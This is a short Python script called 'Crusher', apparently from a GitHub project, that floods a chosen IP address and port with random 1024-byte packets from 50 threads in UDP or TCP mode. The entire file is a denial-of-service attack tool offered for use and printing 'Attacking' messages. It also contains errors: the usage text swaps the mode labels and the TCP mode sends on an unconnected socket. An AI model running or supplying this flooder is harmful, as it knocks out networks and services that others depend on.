import socket # for Connection
import sys # for Args
import random # for Packets
import threading # ?

usage = """
Crusher - v1.0
Usage: 
       python3 Crusher.py <IP> <PORT> <MODE>
Modes:
       udp - TCP Mode
       tcp - UDP Mode


Github <https://github.com/Paxv28/Crusher>
"""
try:
    ip = sys.argv[1] # Set Target IP
    port = sys.argv[2] # Set Target Port
except IndexError:
    pass

def udp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP Socket
    packet = random._urandom(1024) # Packets
    while True:
        try:
            s.sendto(packet, (ip, int(port)))
            print("[#] Attacking %s %s" %(ip, port))
        except:
            print("[!] Error...")
            break
    sys.exit(0)

def tcp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP Socket
    packet = random._urandom(1024) # Packets
    while True:
        try:
            s.sendto(packet, (ip, int(port)))
            print("[#] Attacking %s %s" %(ip, port))
        except:
            print("[!] Error...")
            break
    sys.exit(0)

def main():
    if 'udp' in sys.argv[3]:
        for i in range(50):
            th = threading.Thread(target=udp)
            th.start()
            
    elif 'tcp' in sys.argv[3]:
        for i in range(50):
            th = threading.Thread(target=tcp)
            th.start()

    else:
        print(usage)
    
if len(sys.argv) < 4:
    print(usage)

else:
    main()
